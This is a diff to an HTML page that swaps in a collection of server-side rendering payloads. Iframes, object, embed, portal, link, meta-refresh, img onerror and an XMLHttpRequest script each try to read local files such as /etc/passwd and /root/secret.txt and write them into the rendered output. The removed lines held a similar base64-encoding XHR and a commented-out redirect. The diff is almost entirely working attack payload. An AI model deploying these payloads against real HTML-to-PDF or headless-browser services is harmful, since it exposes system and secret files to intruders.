@@ -4,14 +4,21 @@
     </head>
     <body>
         Hello World!
-        <script>
-            x=new XMLHttpRequest;
-            x.onload=function(){document.write(btoa(this.responseText))};
-            x.open("GET","file:///etc/passwd");x.send();
-        </script>
-        <script>
-            // Javascript redirect to google.com
-            //window.location.replace("https://tinyurl.com/3xdjs3x9");
-        </script>
+        <iframe>
+            <iframe src=file:///etc/passwd></iframe>
+            <img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+            <link rel=attachment href="file:///root/secret.txt">
+            <object data="file:///etc/passwd">
+            <portal src="file:///etc/passwd" id=portal>
+            <embed src="file:///etc/passwd>" width="400" height="400">
+            <style><iframe src="file:///etc/passwd"> 
+            <img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
+            <meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
+            <script>
+                x=new XMLHttpRequest;
+                x.onload=function(){document.write(btoa(this.responseText))};
+                x.open("GET","file:///etc/passwd");x.send();
+            </script>
+        </iframe>
     </body>
 </html>
